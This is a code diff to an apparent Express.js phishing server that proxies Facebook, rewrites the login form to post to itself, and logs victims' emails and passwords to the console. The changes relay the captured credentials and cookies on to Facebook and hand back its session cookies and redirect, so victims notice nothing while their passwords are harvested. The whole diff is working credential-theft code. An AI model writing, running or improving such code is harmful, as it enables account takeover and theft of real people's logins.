@@ -12,6 +12,7 @@ express()
       url: 'https://facebook.com',
       headers: {
         'User-Agent': req.header('User-Agent'),
+        // Ignore cookies so login is forced
       }
     }, function (err, response, body) {
       res.send(body.replace('https://www.facebook.com/login/device-based/regular/login/', `${req.protocol}://${req.get('host')}/login/device-based/regular/login/`));
@@ -22,6 +23,18 @@ express()
     console.log("Email: ", req.body.email);
     console.log("Password: ", req.body.pass);
     const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
-    res.redirect(fullUrl.replace(`${req.protocol}://${req.get('host')}/login/device-based/regular/login/`, 'https://www.facebook.com/login/device-based/regular/login/'));
+
+    request({
+      url: fullUrl.replace(`${req.protocol}://${req.get('host')}/login/device-based/regular/login/`, 'https://www.facebook.com/login/device-based/regular/login/'),
+      formData: {...req.body},
+      method: 'POST',
+      headers: {
+        'User-Agent': req.header('User-Agent'),
+        'Cookie': req.header('Cookie'),
+      }
+    }, function (err, response, body) {
+      res.header('Set-Cookie', response.headers['set-cookie']);
+      res.redirect(response.headers.location);
+    });
   })
   .listen(PORT, () => console.log(`Listening on ${ PORT }`))
